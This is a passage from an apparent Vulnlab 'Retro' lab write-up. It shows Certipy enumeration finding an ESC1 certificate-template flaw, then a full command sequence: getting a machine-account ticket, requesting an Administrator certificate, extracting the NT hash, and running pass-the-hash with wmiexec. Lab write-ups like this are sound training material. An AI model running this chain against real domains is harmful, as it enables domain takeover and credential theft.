</span></span><span style="display:flex;"><span>Certipy v4.8.2 - by Oliver Lyak <span style="color:#f92672">(</span>ly4k<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Finding certificate templates
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found <span style="color:#ae81ff">34</span> certificate templates
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Finding certificate authorities
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found <span style="color:#ae81ff">1</span> certificate authority
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found <span style="color:#ae81ff">12</span> enabled certificate templates
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying to get CA configuration <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#39;retro-DC-CA&#39;</span> via CSRA
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Got error <span style="color:#66d9ef">while</span> trying to get CA configuration <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#39;retro-DC-CA&#39;</span> via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying to get CA configuration <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#39;retro-DC-CA&#39;</span> via RRP
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Failed to connect to remote registry. Service should be starting now. Trying again...
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Got CA configuration <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#39;retro-DC-CA&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Enumeration output:
</span></span><span style="display:flex;"><span>Certificate Authorities
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    CA Name                             : retro-DC-CA
</span></span><span style="display:flex;"><span>    DNS Name                            : DC.retro.vl
</span></span><span style="display:flex;"><span>    Certificate Subject                 : CN<span style="color:#f92672">=</span>retro-DC-CA, DC<span style="color:#f92672">=</span>retro, DC<span style="color:#f92672">=</span>vl
</span></span><span style="display:flex;"><span>    Certificate Serial Number           : 7A107F4C115097984B35539AA62E5C85
</span></span><span style="display:flex;"><span>    Certificate Validity Start          : 2023-07-23 21:03:51+00:00
</span></span><span style="display:flex;"><span>    Certificate Validity End            : 2028-07-23 21:13:50+00:00
</span></span><span style="display:flex;"><span>    Web Enrollment                      : Disabled
</span></span><span style="display:flex;"><span>    User Specified SAN                  : Disabled
</span></span><span style="display:flex;"><span>    Request Disposition                 : Issue
</span></span><span style="display:flex;"><span>    Enforce Encryption <span style="color:#66d9ef">for</span> Requests     : Enabled
</span></span><span style="display:flex;"><span>    Permissions
</span></span><span style="display:flex;"><span>      Owner                             : RETRO.VL<span style="color:#ae81ff">\A</span>dministrators
</span></span><span style="display:flex;"><span>      Access Rights
</span></span><span style="display:flex;"><span>        ManageCertificates              : RETRO.VL<span style="color:#ae81ff">\A</span>dministrators
</span></span><span style="display:flex;"><span>                                          RETRO.VL<span style="color:#ae81ff">\D</span>omain Admins
</span></span><span style="display:flex;"><span>                                          RETRO.VL<span style="color:#ae81ff">\E</span>nterprise Admins
</span></span><span style="display:flex;"><span>        ManageCa                        : RETRO.VL<span style="color:#ae81ff">\A</span>dministrators
</span></span><span style="display:flex;"><span>                                          RETRO.VL<span style="color:#ae81ff">\D</span>omain Admins
</span></span><span style="display:flex;"><span>                                          RETRO.VL<span style="color:#ae81ff">\E</span>nterprise Admins
</span></span><span style="display:flex;"><span>        Enroll                          : RETRO.VL<span style="color:#ae81ff">\A</span>uthenticated Users
</span></span><span style="display:flex;"><span>Certificate Templates
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    Template Name                       : RetroClients
</span></span><span style="display:flex;"><span>    Display Name                        : Retro Clients
</span></span><span style="display:flex;"><span>    Certificate Authorities             : retro-DC-CA
</span></span><span style="display:flex;"><span>    Enabled                             : True
</span></span><span style="display:flex;"><span>    Client Authentication               : True
</span></span><span style="display:flex;"><span>    Enrollment Agent                    : False
</span></span><span style="display:flex;"><span>    Any Purpose                         : False
</span></span><span style="display:flex;"><span>    Enrollee Supplies Subject           : True
</span></span><span style="display:flex;"><span>    Certificate Name Flag               : EnrolleeSuppliesSubject
</span></span><span style="display:flex;"><span>    Enrollment Flag                     : None
</span></span><span style="display:flex;"><span>    Private Key Flag                    : <span style="color:#ae81ff">16842752</span>
</span></span><span style="display:flex;"><span>    Extended Key Usage                  : Client Authentication
</span></span><span style="display:flex;"><span>    Requires Manager Approval           : False
</span></span><span style="display:flex;"><span>    Requires Key Archival               : False
</span></span><span style="display:flex;"><span>    Authorized Signatures Required      : <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    Validity Period                     : <span style="color:#ae81ff">1</span> year
</span></span><span style="display:flex;"><span>    Renewal Period                      : <span style="color:#ae81ff">6</span> weeks
</span></span><span style="display:flex;"><span>    Minimum RSA Key Length              : <span style="color:#ae81ff">4096</span>
</span></span><span style="display:flex;"><span>    Permissions
</span></span><span style="display:flex;"><span>      Enrollment Permissions
</span></span><span style="display:flex;"><span>        Enrollment Rights               : RETRO.VL<span style="color:#ae81ff">\D</span>omain Admins
</span></span><span style="display:flex;"><span>                                          RETRO.VL<span style="color:#ae81ff">\D</span>omain Computers
</span></span><span style="display:flex;"><span>                                          RETRO.VL<span style="color:#ae81ff">\E</span>nterprise Admins
</span></span><span style="display:flex;"><span>      Object Control Permissions
</span></span><span style="display:flex;"><span>        Owner                           : RETRO.VL<span style="color:#ae81ff">\A</span>dministrator
</span></span><span style="display:flex;"><span>        Write Owner Principals          : RETRO.VL<span style="color:#ae81ff">\D</span>omain Admins
</span></span><span style="display:flex;"><span>                                          RETRO.VL<span style="color:#ae81ff">\E</span>nterprise Admins
</span></span><span style="display:flex;"><span>                                          RETRO.VL<span style="color:#ae81ff">\A</span>dministrator
</span></span><span style="display:flex;"><span>        Write Dacl Principals           : RETRO.VL<span style="color:#ae81ff">\D</span>omain Admins
</span></span><span style="display:flex;"><span>                                          RETRO.VL<span style="color:#ae81ff">\E</span>nterprise Admins
</span></span><span style="display:flex;"><span>                                          RETRO.VL<span style="color:#ae81ff">\A</span>dministrator
</span></span><span style="display:flex;"><span>        Write Property Principals       : RETRO.VL<span style="color:#ae81ff">\D</span>omain Admins
</span></span><span style="display:flex;"><span>                                          RETRO.VL<span style="color:#ae81ff">\E</span>nterprise Admins
</span></span><span style="display:flex;"><span>                                          RETRO.VL<span style="color:#ae81ff">\A</span>dministrator
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Vulnerabilities
</span></span><span style="display:flex;"><span>      ESC1                              : <span style="color:#e6db74">&#39;RETRO.VL\\Domain Computers&#39;</span> can enroll, enrollee supplies subject and template allows client authentication
</span></span></code></pre></div><p>Perfect! We have a privilege escalation possibility with ESC1. This vulnerability allows a regular domain user to become domain admin.</p>
<h2 id="exploitation-and-privilege-escalation">Exploitation and Privilege Escalation</h2>
<p>ESC1 is a combination of several misconfigurations:</p>
<ul>
<li>The Enterprise CA grants low-privileged users enrollment rights.</li>
<li>No authorized signatures are required.</li>
<li>An overly permissive certificate template security descriptor grants certificate enrollment rights to low-privileged users.</li>
<li>Manager approval is disabled.</li>
<li>The certificate template defines EKUs that enable authentication.</li>
<li>The certificate template allows requesters to specify a subjectAltName in the CSR.</li>
</ul>
<p>To exploit this vulnerability we need a computer account on the domain. Fortunately, we found a pre-created computer earlier. With this we can request a Kerberos ticket, which we can use to perform a pass-the-ticket attack with certipy to request a certificate with the UPN &lsquo;Administrator&rsquo;. This certificate will allow us to obtain the Administrator&rsquo;s TGT to extract the Administrator&rsquo;s NT hash from the ticket and use this hash in a pass-the-hash attack.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>// get TGT of BANKING$
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Oct 14, <span style="color:#ae81ff">2025</span> - 21:09:25 <span style="color:#f92672">(</span>CEST<span style="color:#f92672">)]</span> exegol-vulnlab /workspace <span style="color:#75715e"># getTGT.py -dc-ip 10.10.98.67 &#39;retro.vl/banking$:banking&#39;</span>
</span></span><span style="display:flex;"><span>Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Saving ticket in banking$.ccache
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Oct 14, <span style="color:#ae81ff">2025</span> - 21:11:05 <span style="color:#f92672">(</span>CEST<span style="color:#f92672">)]</span> exegol-vulnlab /workspace <span style="color:#75715e"># export KRB5CCNAME=banking\$.ccache</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Oct 14, <span style="color:#ae81ff">2025</span> - 21:12:48 <span style="color:#f92672">(</span>CEST<span style="color:#f92672">)]</span> exegol-vulnlab /workspace <span style="color:#75715e"># klist</span>
</span></span><span style="display:flex;"><span>Ticket cache: FILE:banking$.ccache
</span></span><span style="display:flex;"><span>Default principal: banking$@RETRO.VL
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Valid starting       Expires              Service principal
</span></span><span style="display:flex;"><span>10/14/2025 21:10:33  10/15/2025 07:10:33  krbtgt/RETRO.VL@RETRO.VL
</span></span><span style="display:flex;"><span>	renew <span style="color:#66d9ef">until</span> 10/15/2025 21:10:35
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>// request administrator certificate 
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Oct 14, <span style="color:#ae81ff">2025</span> - 21:16:44 <span style="color:#f92672">(</span>CEST<span style="color:#f92672">)]</span> exegol-vulnlab /workspace <span style="color:#75715e"># certipy req -k -no-pass -ca retro-DC-CA -upn Administrator -template RetroClients -target dc.retro.vl -key-size 4096</span>
</span></span><span style="display:flex;"><span>Certipy v4.8.2 - by Oliver Lyak <span style="color:#f92672">(</span>ly4k<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Requesting certificate via RPC
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Successfully requested certificate
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Request ID is <span style="color:#ae81ff">11</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Got certificate with UPN <span style="color:#e6db74">&#39;Administrator&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Certificate has no object SID
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Saved certificate and private key to <span style="color:#e6db74">&#39;administrator.pfx&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>// get NT hash of the administrator
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Oct 14, <span style="color:#ae81ff">2025</span> - 21:18:01 <span style="color:#f92672">(</span>CEST<span style="color:#f92672">)]</span> exegol-vulnlab /workspace <span style="color:#75715e"># certipy auth -pfx administrator.pfx -username Administrator -domain retro.vl</span>
</span></span><span style="display:flex;"><span>Certipy v4.8.2 - by Oliver Lyak <span style="color:#f92672">(</span>ly4k<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Using principal: administrator@retro.vl
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying to get TGT...
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Got TGT
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Saved credential cache to <span style="color:#e6db74">&#39;administrator.ccache&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying to retrieve NT hash <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#39;administrator&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Got hash <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#39;administrator@retro.vl&#39;</span>: aad3b435b51404eeaad3b435b51404ee:252fac7066d93dd009d4fd2cd0368389
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>// pass-the-hash
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Oct 14, <span style="color:#ae81ff">2025</span> - 21:19:34 <span style="color:#f92672">(</span>CEST<span style="color:#f92672">)]</span> exegol-vulnlab /workspace <span style="color:#75715e"># wmiexec.py administrator@10.10.98.67 -hashes aad3b435b51404eeaad3b435b51404ee:252fac7066d93dd009d4fd2cd0368389</span>
</span></span></code></pre></div><p>We are now connected as admin and can get the flag.</p>
<p>Thanks for reading!</p>

            </div>

            
            
            <div class="related-posts">
                <h3>Related Content</h3>
                <div class="related-grid">
                    
                    <div class="related-post">
                        <h4><a href="http://localhost:1313/posts/retro2/">Vulnlab : Retro2 Easy</a></h4>
                        <div class="related-meta">
                            2025.10.16 •
                            
                            
                            
                            
                            
                            ☕☕☕☕☕ 7 min read
                        </div>
                    </div>
                    
                    <div class="related-post">
                        <h4><a href="http://localhost:1313/posts/baby/vulnlab_baby/">Vulnlab : Baby Easy</a></h4>
                        <div class="related-meta">
                            2025.10.12 •
                            
                            
                            
                            
                            
                            ☕☕☕☕☕ 6 min read
                        </div>
                    </div>
                    
                    <div class="related-post">
                        <h4><a href="http://localhost:1313/about/about/">My First Post</a></h4>
                        <div class="related-meta">
                            2025.09.15 •
                            
                            
                            
                            
                            
                             0 min read
                        </div>
                    </div>
                    
                </div>
            </div>
            

            
            <nav class="post-navigation">
                
                <div class="nav-previous">
                    <span class="nav-label">← Previous</span>
                    <a href="http://localhost:1313/posts/retro2/" class="nav-title">Vulnlab : Retro2 Easy</a>
                </div>
                

                
                <div></div>
                
            </nav>
        </article>

        <aside class="sidebar">
            <nav class="toc">
                <h4>Contents</h4>
                <div id="toc-content">
                    
                </div>
            </nav>
        </aside>
        </div>
    </div>
</div>

    </main>

    

    <script src="http://localhost:1313/js/main.js"></script>
</body>
</html>
